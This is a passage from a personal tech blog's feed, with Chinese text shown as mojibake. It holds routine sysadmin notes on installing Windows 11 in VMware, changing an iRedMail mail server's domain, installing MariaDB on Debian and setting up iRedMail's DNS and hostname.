    <summary type="html">&lt;h1 id=&quot;vps-cloud-mobile&quot;&gt;&lt;a href=&quot;#vps-cloud-mobile&quot; class=&quot;headerlink&quot; title=&quot;vps cloud mobile&quot;&gt;&lt;/a&gt;vps cloud mobile&lt;/h1&gt;&lt;p&gt;VPSäº‘æœåŠ¡å™¨æ­å»ºäº‘æ‰‹æœºæ•™ç¨‹</summary>
      
    
    
    
    <category term="æŠ€æœ¯" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="vps" scheme="https://banjinmei.github.io/tags/vps/"/>
    
  </entry>
  
  <entry>
    <title>vmware install win11</title>
    <link href="https://banjinmei.github.io/2024/12/26/vmware-install-win11/"/>
    <id>https://banjinmei.github.io/2024/12/26/vmware-install-win11/</id>
    <published>2024-12-25T17:01:25.000Z</published>
    <updated>2024-12-25T17:27:40.521Z</updated>
    
    <content type="html"><![CDATA[<h1 id="VMwareå®‰è£…win11"><a href="#VMwareå®‰è£…win11" class="headerlink" title="VMwareå®‰è£…win11"></a>VMwareå®‰è£…win11</h1><h1 id="æ–°å»ºè™šæ‹Ÿæœº"><a href="#æ–°å»ºè™šæ‹Ÿæœº" class="headerlink" title="æ–°å»ºè™šæ‹Ÿæœº"></a>æ–°å»ºè™šæ‹Ÿæœº</h1><p>ç¨åå®‰è£…ç³»ç»Ÿ</p><h1 id="å³é”®-ç”µæº-è¿›å…¥å›ºä»¶"><a href="#å³é”®-ç”µæº-è¿›å…¥å›ºä»¶" class="headerlink" title="å³é”® ç”µæº  è¿›å…¥å›ºä»¶"></a>å³é”® ç”µæº  è¿›å…¥å›ºä»¶</h1><p>å‡ºç° æ— æ³•è¿æ¥è™šæ‹Ÿè®¾å¤‡ sata0ï¼š1ï¼Œå› ä¸ºä¸»æœºä¸Šæ²¡ç”¨ç›¸åº”è®¾å¤‡<br>è®¾å¤‡-å¯åŠ¨æ—¶è¿æ¥ å–æ¶ˆæ‰“é’©</p><p>å³é”® å¯ç§»åŠ¨è®¾å¤‡ - Uç›˜è¿æ¥</p><h1 id="è¿›å…¥PE"><a href="#è¿›å…¥PE" class="headerlink" title="è¿›å…¥PE"></a>è¿›å…¥PE</h1><p>æ‰“å¼€DG å³é”®è½¬ä¸ºGUID ä¿å­˜æ›´æ”¹ </p><h2 id="é¡¶éƒ¨ç©ºé—²å³é”®-åˆ›å»ºESPåˆ†åŒº"><a href="#é¡¶éƒ¨ç©ºé—²å³é”®-åˆ›å»ºESPåˆ†åŒº" class="headerlink" title="é¡¶éƒ¨ç©ºé—²å³é”® åˆ›å»ºESPåˆ†åŒº"></a>é¡¶éƒ¨ç©ºé—²å³é”® åˆ›å»ºESPåˆ†åŒº</h2><p>ç©ºé—´å»ºç«‹æ–°åˆ†åŒº ç³»ç»Ÿåˆ†åŒº D<br>Save<br>ESPå³é”® æŒ‡å®šæ–°çš„é©±åŠ¨å™¨-ç›˜ç¬¦ F</p><p>å»ºç«‹åˆ†åŒº<br>ä¿å­˜æ ¼å¼åŒ–</p><h1 id="ä¸€é”®è£…æœº"><a href="#ä¸€é”®è£…æœº" class="headerlink" title="ä¸€é”®è£…æœº"></a>ä¸€é”®è£…æœº</h1><p>!æ³¨æ„ç›®æ ‡åˆ†åŒºD&#x2F;å¼•å¯¼åˆ†åŒºF </p><p>å®‰è£…å®Œé‡å¯å </p><h1 id="å³é”®-å¯ç§»åŠ¨è®¾å¤‡-Uç›˜æ–­å¼€"><a href="#å³é”®-å¯ç§»åŠ¨è®¾å¤‡-Uç›˜æ–­å¼€" class="headerlink" title="å³é”® å¯ç§»åŠ¨è®¾å¤‡ - Uç›˜æ–­å¼€"></a>å³é”® å¯ç§»åŠ¨è®¾å¤‡ - Uç›˜æ–­å¼€</h1><p>å¼•å¯¼å®‰è£…</p><p>END</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;VMwareå®‰è£…win11&quot;&gt;&lt;a href=&quot;#VMwareå®‰è£…win11&quot; class=&quot;headerlink&quot; title=&quot;VMwareå®‰è£…win11&quot;&gt;&lt;/a&gt;VMwareå®‰è£…win11&lt;/h1&gt;&lt;h1 id=&quot;æ–°å»ºè™šæ‹Ÿæœº&quot;&gt;&lt;a href=&quot;#æ–°å»ºè™šæ‹Ÿ</summary>
      
    
    
    
    <category term="æŠ€æœ¯" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="vm" scheme="https://banjinmei.github.io/tags/vm/"/>
    
    <category term="win11" scheme="https://banjinmei.github.io/tags/win11/"/>
    
  </entry>
  
  <entry>
    <title>update domain 4 iRedMail</title>
    <link href="https://banjinmei.github.io/2024/12/21/update-domain-4-iRedMail/"/>
    <id>https://banjinmei.github.io/2024/12/21/update-domain-4-iRedMail/</id>
    <published>2024-12-21T15:20:53.000Z</published>
    <updated>2024-12-21T15:26:34.985Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ›´æ¢-iRedMail-çš„åŸŸå"><a href="#æ›´æ¢-iRedMail-çš„åŸŸå" class="headerlink" title="æ›´æ¢ iRedMail çš„åŸŸå"></a>æ›´æ¢ iRedMail çš„åŸŸå</h1><p>ï¼ˆå¦‚ä» mail.example.com æ›´æ¢ä¸º mail.mydomain.comï¼‰ï¼Œ<br>éœ€è¦ä¿®æ”¹å¤šä¸ªé…ç½®æ–‡ä»¶å’Œæ•°æ®åº“è®°å½•ï¼Œå¹¶ç¡®ä¿æ–°çš„åŸŸåé…ç½®æ­£ç¡®ã€‚<br>ä»¥ä¸‹æ˜¯æ“ä½œæ­¥éª¤ï¼š</p><h1 id="æ­¥éª¤-1ï¼šæ›´æ–°-DNS-è®°å½•"><a href="#æ­¥éª¤-1ï¼šæ›´æ–°-DNS-è®°å½•" class="headerlink" title="æ­¥éª¤ 1ï¼šæ›´æ–° DNS è®°å½•"></a>æ­¥éª¤ 1ï¼šæ›´æ–° DNS è®°å½•</h1><p>åœ¨åŸŸåæ‰˜ç®¡å¹³å°æ›´æ–° mail.mydomain.com çš„ DNS è®°å½•ï¼š<br>Aè®°å½•ï¼šæŒ‡å‘é‚®ä»¶æœåŠ¡å™¨çš„ IP åœ°å€ã€‚<br>MXè®°å½•ï¼šæŒ‡å‘ mail.mydomain.comã€‚<br>SPF è®°å½•ï¼šç¡®ä¿åŒ…æ‹¬æ–°çš„åŸŸåã€‚<br>DKIM å’Œ DMARC è®°å½•ï¼šé‡æ–°ç”Ÿæˆå¹¶æ›´æ–°ã€‚<br>ç¡®ä¿ DNS æ›´æ”¹åå¯ä»¥é€šè¿‡ dig æˆ– nslookup éªŒè¯ç”Ÿæ•ˆã€‚</p><h1 id="æ­¥éª¤-2ï¼šæ›´æ–°ä¸»æœºå"><a href="#æ­¥éª¤-2ï¼šæ›´æ–°ä¸»æœºå" class="headerlink" title="æ­¥éª¤ 2ï¼šæ›´æ–°ä¸»æœºå"></a>æ­¥éª¤ 2ï¼šæ›´æ–°ä¸»æœºå</h1><p>ä¿®æ”¹ä¸»æœºåï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">hostnamectl set-hostname mail.mydomain.com</span><br></pre></td></tr></table></figure><p>æ›´æ–° &#x2F;etc&#x2F;hosts æ–‡ä»¶ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1   localhost</span><br><span class="line">127.0.1.1   mail.mydomain.com mail</span><br></pre></td></tr></table></figure><p>æ›´æ–° &#x2F;etc&#x2F;mailname æ–‡ä»¶ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mail.mydomain.com</span><br></pre></td></tr></table></figure><h1 id="æ­¥éª¤-3ï¼šæ›´æ–°-iRedMail-é…ç½®æ–‡ä»¶"><a href="#æ­¥éª¤-3ï¼šæ›´æ–°-iRedMail-é…ç½®æ–‡ä»¶" class="headerlink" title="æ­¥éª¤ 3ï¼šæ›´æ–° iRedMail é…ç½®æ–‡ä»¶"></a>æ­¥éª¤ 3ï¼šæ›´æ–° iRedMail é…ç½®æ–‡ä»¶</h1><p>ä¿®æ”¹ Postfix é…ç½®ï¼š ç¼–è¾‘ &#x2F;etc&#x2F;postfix&#x2F;main.cfï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">myhostname = mail.mydomain.com</span><br><span class="line">mydomain = mydomain.com</span><br><span class="line">myorigin = <span class="variable">$mydomain</span></span><br></pre></td></tr></table></figure><p>é‡å¯ Postfixï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart postfix</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ Dovecot é…ç½®ï¼š ç¼–è¾‘ &#x2F;etc&#x2F;dovecot&#x2F;dovecot.conf å’Œ &#x2F;etc&#x2F;dovecot&#x2F;conf.d&#x2F;10-mail.confï¼Œç¡®ä¿æ›´æ–°ä¸»æœºåï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssl_cert = &lt;/etc/ssl/certs/mail.igrmail.pics.crt</span><br><span class="line">ssl_key = &lt;/etc/ssl/private/mail.igrmail.pics.key</span><br></pre></td></tr></table></figure><p>é‡å¯ Dovecotï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart dovecot</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ Amavisd é…ç½®ï¼š ç¼–è¾‘ &#x2F;etc&#x2F;amavis&#x2F;conf.d&#x2F;50-userï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$myhostname</span> = <span class="string">&#x27;mail.mydomain.com&#x27;</span>;</span><br></pre></td></tr></table></figure><p>é‡å¯ Amavisdï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">systemctl restart amavis</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ iRedAdmin é…ç½®ï¼š ç¼–è¾‘ &#x2F;opt&#x2F;www&#x2F;iredadmin&#x2F;settings.pyï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web_hostname = <span class="string">&#x27;mail.igrmail.pics&#x27;</span></span><br></pre></td></tr></table></figure><p>é‡å¯ iRedAdminï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart iredadmin</span><br></pre></td></tr></table></figure><h1 id="æ­¥éª¤-4ï¼šæ›´æ–°æ•°æ®åº“è®°å½•"><a href="#æ­¥éª¤-4ï¼šæ›´æ–°æ•°æ®åº“è®°å½•" class="headerlink" title="æ­¥éª¤ 4ï¼šæ›´æ–°æ•°æ®åº“è®°å½•"></a>æ­¥éª¤ 4ï¼šæ›´æ–°æ•°æ®åº“è®°å½•</h1><p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ç™»å½•æ•°æ®åº“ï¼ˆé€šå¸¸æ˜¯ MySQL&#x2F;MariaDBï¼‰ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure><p>æ›´æ–° vmail æ•°æ®åº“ä¸­çš„åŸŸåï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">USE vmail;</span><br><span class="line"><span class="keyword">UPDATE</span> domain <span class="keyword">SET</span> domain<span class="operator">=</span><span class="string">&#x27;new&#x27;</span> <span class="keyword">WHERE</span> domain<span class="operator">=</span><span class="string">&#x27;old&#x27;</span>;</span><br><span class="line"><span class="keyword">UPDATE</span> alias <span class="keyword">SET</span> address<span class="operator">=</span>REPLACE(address, <span class="string">&#x27;old&#x27;</span>, <span class="string">&#x27;@new&#x27;</span>);</span><br><span class="line"><span class="keyword">UPDATE</span> mailbox <span class="keyword">SET</span> username<span class="operator">=</span>REPLACE(username, <span class="string">&#x27;@old&#x27;</span>, <span class="string">&#x27;@new&#x27;</span>);</span><br></pre></td></tr></table></figure><h1 id="æ­¥éª¤-5ï¼šé‡æ–°ç”Ÿæˆ-SSL-è¯ä¹¦"><a href="#æ­¥éª¤-5ï¼šé‡æ–°ç”Ÿæˆ-SSL-è¯ä¹¦" class="headerlink" title="æ­¥éª¤ 5ï¼šé‡æ–°ç”Ÿæˆ SSL è¯ä¹¦"></a>æ­¥éª¤ 5ï¼šé‡æ–°ç”Ÿæˆ SSL è¯ä¹¦</h1><p>å¦‚æœä½ ä½¿ç”¨ Letâ€™s Encryptï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">certbot --apache -d mail.xxx</span><br></pre></td></tr></table></figure><p>å°†æ–°ç”Ÿæˆçš„è¯ä¹¦è·¯å¾„æ›´æ–°åˆ°ç›¸å…³æœåŠ¡çš„é…ç½®æ–‡ä»¶ä¸­ï¼ˆå¦‚ Postfixã€Dovecotï¼‰ã€‚</p><h1 id="æ­¥éª¤-6ï¼šé‡å¯æ‰€æœ‰ç›¸å…³æœåŠ¡"><a href="#æ­¥éª¤-6ï¼šé‡å¯æ‰€æœ‰ç›¸å…³æœåŠ¡" class="headerlink" title="æ­¥éª¤ 6ï¼šé‡å¯æ‰€æœ‰ç›¸å…³æœåŠ¡"></a>æ­¥éª¤ 6ï¼šé‡å¯æ‰€æœ‰ç›¸å…³æœåŠ¡</h1><p>ç¡®ä¿æ‰€æœ‰æœåŠ¡éƒ½é‡å¯ä»¥åŠ è½½æ–°çš„é…ç½®ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">systemctl restart postfix dovecot amavis clamav spamassassin iredapd iredadmin</span><br></pre></td></tr></table></figure><h1 id="æ­¥éª¤-7ï¼šéªŒè¯é…ç½®"><a href="#æ­¥éª¤-7ï¼šéªŒè¯é…ç½®" class="headerlink" title="æ­¥éª¤ 7ï¼šéªŒè¯é…ç½®"></a>æ­¥éª¤ 7ï¼šéªŒè¯é…ç½®</h1><p>æ£€æŸ¥æœåŠ¡çŠ¶æ€ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status postfix dovecot amavis</span><br></pre></td></tr></table></figure><p>å‘é€å’Œæ¥æ”¶æµ‹è¯•é‚®ä»¶ï¼Œç¡®ä¿æ–°åŸŸåèƒ½æ­£å¸¸å·¥ä½œã€‚<br>éªŒè¯ MXã€SPFã€DKIM å’Œ DMARC è®°å½•æ˜¯å¦æ­£ç¡®ã€‚<br>å®Œæˆè¿™äº›æ­¥éª¤åï¼Œä½ çš„é‚®ä»¶æœåŠ¡å™¨å°†ä¼šåˆ‡æ¢åˆ°æ–°çš„åŸŸåã€‚</p><h1 id="debian-å®‰è£…-MariaDB"><a href="#debian-å®‰è£…-MariaDB" class="headerlink" title="debian å®‰è£… MariaDB"></a>debian å®‰è£… MariaDB</h1><p>åœ¨Debianç³»ç»Ÿä¸Šå®‰è£…MariaDBï¼Œä½ å¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤æ“ä½œï¼š</p><p>æ›´æ–°ç³»ç»ŸåŒ…åˆ—è¡¨ï¼š</p><p>sudo apt update<br>å®‰è£…MariaDBæœåŠ¡å™¨ï¼š</p><p>sudo apt install mariadb-server<br>å®‰å…¨è®¾ç½®MariaDBï¼ŒåŒ…æ‹¬è®¾ç½®rootå¯†ç å’Œåˆ é™¤åŒ¿åç”¨æˆ·ï¼š</p><p>sudo mysql_secure_installation<br>å¯åŠ¨MariaDBæœåŠ¡ï¼š</p><p>sudo systemctl start mariadb<br>ä½¿MariaDBæœåŠ¡åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶è‡ªåŠ¨è¿è¡Œï¼š</p><p>sudo systemctl enable mariadb<br>ç™»å½•MariaDBä»¥ç¡®ä¿ä¸€åˆ‡æ­£å¸¸ï¼š</p><p>sudo mysql -u root -p<br>å½“ç³»ç»Ÿæç¤ºè¾“å…¥å¯†ç æ—¶ï¼Œè¾“å…¥ä½ åœ¨å®‰å…¨è®¾ç½®æ­¥éª¤ä¸­è®¾ç½®çš„å¯†ç ã€‚</p><p>ä»¥ä¸Šæ­¥éª¤å°†åœ¨Debianç³»ç»Ÿä¸Šå®‰è£…MariaDBï¼Œå¹¶ç¡®ä¿å…¶å®‰å…¨å’Œè‡ªåŠ¨å¯åŠ¨ã€‚</p><p>è¿æ¥MariaDB (like mysql)<br>SHOW DATABASES;<br>SHOW TABLES;</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;æ›´æ¢-iRedMail-çš„åŸŸå&quot;&gt;&lt;a href=&quot;#æ›´æ¢-iRedMail-çš„åŸŸå&quot; class=&quot;headerlink&quot; title=&quot;æ›´æ¢ iRedMail çš„åŸŸå&quot;&gt;&lt;/a&gt;æ›´æ¢ iRedMail çš„åŸŸå&lt;/h1&gt;&lt;p&gt;ï¼ˆå¦‚ä» mail.example.c</summary>
      
    
    
    
    <category term="æŠ€æœ¯" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="debian" scheme="https://banjinmei.github.io/tags/debian/"/>
    
    <category term="iRedMail" scheme="https://banjinmei.github.io/tags/iRedMail/"/>
    
  </entry>
  
  <entry>
    <title>iRedMail smtp</title>
    <link href="https://banjinmei.github.io/2024/12/19/iRedMail-smtp/"/>
    <id>https://banjinmei.github.io/2024/12/19/iRedMail-smtp/</id>
    <published>2024-12-19T12:50:57.000Z</published>
    <updated>2025-01-27T10:13:23.549Z</updated>
    
    <content type="html"><![CDATA[<h1 id="iRedMail"><a href="#iRedMail" class="headerlink" title="iRedMail"></a>iRedMail</h1><p>iRedMail æ˜¯ä¸€ä¸ª shell è„šæœ¬ï¼Œå¯ä»¥åœ¨ Linux&#x2F;BSD æœåŠ¡å™¨ä¸Šè‡ªåŠ¨å®‰è£…å’Œé…ç½®æ‰€æœ‰å¿…éœ€çš„é‚®ä»¶æœåŠ¡å™¨ç»„ä»¶ï¼Œä»è€Œæ¶ˆé™¤æ‰‹åŠ¨å®‰è£…å’Œé…ç½®ã€‚å€ŸåŠ© iRedMailï¼Œå¯ä»¥åœ¨åŸºäº Web çš„ç®¡ç†é¢æ¿ä¸­è½»æ¾åˆ›å»ºæ— é™çš„é‚®ç®±å’Œæ— é™çš„é‚®ä»¶åŸŸã€‚é‚®ç®±å¯ä»¥å­˜å‚¨åœ¨ MariaDB&#x2F;MySQLã€PostreSQL æ•°æ®åº“æˆ– OpenLDAP ä¸­ã€‚ä»¥ä¸‹æ˜¯ iRedMail å°†è‡ªåŠ¨å®‰è£…å’Œé…ç½®çš„å¼€æºè½¯ä»¶çš„åˆ—è¡¨ã€‚</p><p>Postfix<strong>SMTP</strong> æœåŠ¡å™¨<br>Dovecot IMAP æœåŠ¡å™¨<br>Nginx ç½‘ç»œæœåŠ¡å™¨ï¼Œä¸ºç®¡ç†é¢æ¿å’Œç½‘ç»œé‚®ä»¶æä¾›æœåŠ¡<br>OpenLDAPã€<strong>MySQL&#x2F;MariaDB</strong> æˆ– PostgreSQL ç”¨äºå­˜å‚¨ç”¨æˆ·ä¿¡æ¯<br>Amavided-ç”¨äº DKIM ç­¾åå’ŒéªŒè¯çš„æ–°åŠŸèƒ½<br>SpamAssassin ç”¨äºååƒåœ¾é‚®ä»¶<br>ClamAV ç”¨äºé˜²ç—…æ¯’<br>Roundcube ç½‘ç»œé‚®ä»¶<br>SOGoç»„ä»¶ï¼Œæä¾›ç½‘ç»œé‚®ä»¶ã€æ—¥å†(CalDAV)ã€è”ç³»äºº(CardDAV)ã€ä»»åŠ¡å’ŒActiveSyncæœåŠ¡ã€‚<br>ç”¨äºä¿æŠ¤ SSH çš„ Fail2ban<br>mlmmj é‚®ä»¶åˆ—è¡¨ç®¡ç†å™¨<br>ç½‘ç»œæ•°æ®æœåŠ¡å™¨ç›‘æ§<br>ç”¨äºç°åå•çš„ iRedAPD Postfix ç­–ç•¥æœåŠ¡å™¨</p><h1 id="1-åˆ›å»º-DNS-MX-è®°å½•"><a href="#1-åˆ›å»º-DNS-MX-è®°å½•" class="headerlink" title="1.åˆ›å»º DNS MX è®°å½•"></a>1.åˆ›å»º DNS MX è®°å½•</h1><p>MX è®°å½•æŒ‡å®šå“ªä¸ªæˆ–å“ªäº›ä¸»æœºå¤„ç†ç‰¹å®šåŸŸåçš„ç”µå­é‚®ä»¶ã€‚ä¾‹å¦‚ï¼Œå¤„ç† linux-terminal.com ç”µå­é‚®ä»¶çš„ä¸»æœºæ˜¯ mail.linux-terminal.comã€‚å¦‚æœæ‹¥æœ‰ Gmail å¸æˆ·çš„äººå‘ [email  å‘é€ç”µå­é‚®ä»¶ï¼Œåˆ™ Gmail æœåŠ¡å™¨å°†æŸ¥è¯¢ linux-terminal.com çš„ MX è®°å½•ã€‚å½“å‘ç°mail.linux-terminal.comè´Ÿè´£æ¥æ”¶é‚®ä»¶æ—¶ï¼Œå®ƒä¼šæŸ¥è¯¢mail.linux-terminal.comçš„Aè®°å½•æ¥è·å–IPåœ°å€ï¼Œä»è€Œå¯ä»¥å‘é€ç”µå­é‚®ä»¶ã€‚</p><p>å¯ä»¥ç™»å½•åŸŸåæ³¨å†Œå•†çš„ç½‘ç«™ï¼ˆä¾‹å¦‚ NameCheapï¼‰æ¥åˆ›å»º DNS è®°å½•ã€‚</p><p>åœ¨ DNS ç®¡ç†å™¨ä¸­ï¼Œä¸ºåŸŸååˆ›å»º MX è®°å½•ã€‚åœ¨â€œåç§°â€å­—æ®µä¸­è¾“å…¥ @ ä»¥è¡¨ç¤ºä¸»åŸŸåï¼Œç„¶ååœ¨â€œå€¼â€å­—æ®µä¸­è¾“å…¥ mail.your-domain.comã€‚</p><p>æ³¨æ„ï¼šMXè®°å½•çš„ä¸»æœºåä¸èƒ½æ˜¯å…¶ä»–åç§°çš„åˆ«åã€‚å¦å¤–ï¼Œå¼ºçƒˆå»ºè®®ä½¿ç”¨ä¸»æœºåè€Œä¸æ˜¯è£¸ IP åœ°å€ä½œä¸º MX è®°å½•ã€‚</p><p> DNS ç®¡ç†å™¨å¯èƒ½ä¼šè¦æ±‚è¾“å…¥é¦–é€‰é¡¹å€¼ï¼ˆä¹Ÿç§°ä¸ºä¼˜å…ˆçº§å€¼ï¼‰ã€‚å®ƒå¯ä»¥æ˜¯ 0 åˆ° 65,356 ä¹‹é—´çš„ä»»æ„æ•°å­—ã€‚å°æ•°å­—æ¯”å¤§æ•°å­—å…·æœ‰æ›´é«˜çš„ä¼˜å…ˆçº§ã€‚å»ºè®®å°†è¯¥å€¼è®¾ç½®ä¸º0ï¼Œè¿™æ ·è¯¥é‚®ä»¶æœåŠ¡å™¨å°†å…·æœ‰æœ€é«˜çš„ä¼˜å…ˆçº§æ¥æ¥æ”¶ç”µå­é‚®ä»¶ã€‚åˆ›å»º MX è®°å½•åï¼Œè¿˜éœ€è¦ä¸º mail.your-domain.com åˆ›å»º A è®°å½•ï¼Œä»¥ä¾¿å°†å…¶è§£æä¸º IP åœ°å€ã€‚å¦‚æœæœåŠ¡å™¨ä½¿ç”¨ IPv6 åœ°å€ï¼Œè¯·åŠ¡å¿…æ·»åŠ  AAAA è®°å½•ã€‚</p><p>æç¤ºï¼šå¦‚æœä½¿ç”¨ Cloudflare DNS æœåŠ¡ï¼Œåˆ™åœ¨ä¸º mail.your-domain.com åˆ›å»º A è®°å½•æ—¶ä¸åº”å¯ç”¨ CDN åŠŸèƒ½ã€‚ Cloudflare ä¸æ”¯æŒ SMTP ä»£ç†ã€‚</p><p>@ . mail A è®°å½• åˆ° IP     mail MX è®°å½•åˆ° mail.your-domain.com</p><h1 id="2-é…ç½®ä¸»æœºå"><a href="#2-é…ç½®ä¸»æœºå" class="headerlink" title="2.é…ç½®ä¸»æœºå"></a>2.é…ç½®ä¸»æœºå</h1><p>é€šè¿‡ SSH ç™»å½•æœåŠ¡å™¨ï¼Œç„¶åè¿è¡Œä»¥ä¸‹å‘½ä»¤æ¥æ›´æ–°ç°æœ‰è½¯ä»¶åŒ…ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update;</span><br><span class="line">sudo apt upgrade;</span><br></pre></td></tr></table></figure><p>å»ºè®®åˆ›å»ºä¸€ä¸ª sudo ç”¨æˆ·æ¥ç®¡ç†æœåŠ¡å™¨ï¼Œè€Œä¸æ˜¯ä½¿ç”¨é»˜è®¤çš„ root ç”¨æˆ·ã€‚è¿è¡Œä»¥ä¸‹å‘½ä»¤åˆ›å»ºç”¨æˆ·ã€‚å°† username æ›¿æ¢ä¸ºé¦–é€‰çš„ç”¨æˆ·åã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adduser username</span><br></pre></td></tr></table></figure><p>ç„¶åå°†ç”¨æˆ·æ·»åŠ åˆ° sudo ç»„ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adduser username sudo</span><br></pre></td></tr></table></figure><p>ç„¶ååˆ‡æ¢åˆ°æ–°ç”¨æˆ·ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su - username</span><br></pre></td></tr></table></figure><h1 id="æ¥ä¸‹æ¥ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ä¸ºæœåŠ¡å™¨è®¾ç½®å®Œå…¨é™å®šåŸŸå-FQDN-ã€‚"><a href="#æ¥ä¸‹æ¥ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ä¸ºæœåŠ¡å™¨è®¾ç½®å®Œå…¨é™å®šåŸŸå-FQDN-ã€‚" class="headerlink" title="æ¥ä¸‹æ¥ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ä¸ºæœåŠ¡å™¨è®¾ç½®å®Œå…¨é™å®šåŸŸå (FQDN)ã€‚"></a>æ¥ä¸‹æ¥ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ä¸ºæœåŠ¡å™¨è®¾ç½®å®Œå…¨é™å®šåŸŸå (FQDN)ã€‚</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo hostnamectl set-hostname mail.your-domain.com</span><br></pre></td></tr></table></figure><p>ä»¬è¿˜éœ€è¦ä½¿ç”¨ Nano ç­‰å‘½ä»¤è¡Œæ–‡æœ¬ç¼–è¾‘å™¨æ›´æ–° &#x2F;etc&#x2F;hosts æ–‡ä»¶ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/hosts</span><br></pre></td></tr></table></figure><p>åƒä¸‹é¢è¿™æ ·ç¼–è¾‘å®ƒã€‚ ï¼ˆä½¿ç”¨ç®­å¤´é”®åœ¨æ–‡ä»¶ä¸­ç§»åŠ¨å…‰æ ‡ã€‚ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1       mail.your-domain.com localhost</span><br></pre></td></tr></table></figure><p>ä¿å­˜å¹¶å…³é—­æ–‡ä»¶ã€‚ ï¼ˆè¦åœ¨ Nano æ–‡æœ¬ç¼–è¾‘å™¨ä¸­ä¿å­˜æ–‡ä»¶ï¼Œè¯·æŒ‰ Ctrl+Oï¼Œç„¶åæŒ‰ Enter ç¡®è®¤ã€‚è¦å…³é—­æ–‡ä»¶ï¼Œè¯·æŒ‰ Ctrl+X &gt;.)</p><p>è¦æŸ¥çœ‹æ›´æ”¹ï¼Œè¯·æ³¨é”€å¹¶é‡æ–°ç™»å½•ï¼Œç„¶åè¿è¡Œä»¥ä¸‹å‘½ä»¤ä»¥æŸ¥çœ‹ä¸»æœºåã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hostname -f</span><br></pre></td></tr></table></figure><h1 id="3-ä½¿ç”¨-iRedMail-åœ¨-Debian-12-ä¸Šè®¾ç½®é‚®ä»¶æœåŠ¡å™¨"><a href="#3-ä½¿ç”¨-iRedMail-åœ¨-Debian-12-ä¸Šè®¾ç½®é‚®ä»¶æœåŠ¡å™¨" class="headerlink" title="3.ä½¿ç”¨ iRedMail åœ¨ Debian 12 ä¸Šè®¾ç½®é‚®ä»¶æœåŠ¡å™¨"></a>3.ä½¿ç”¨ iRedMail åœ¨ Debian 12 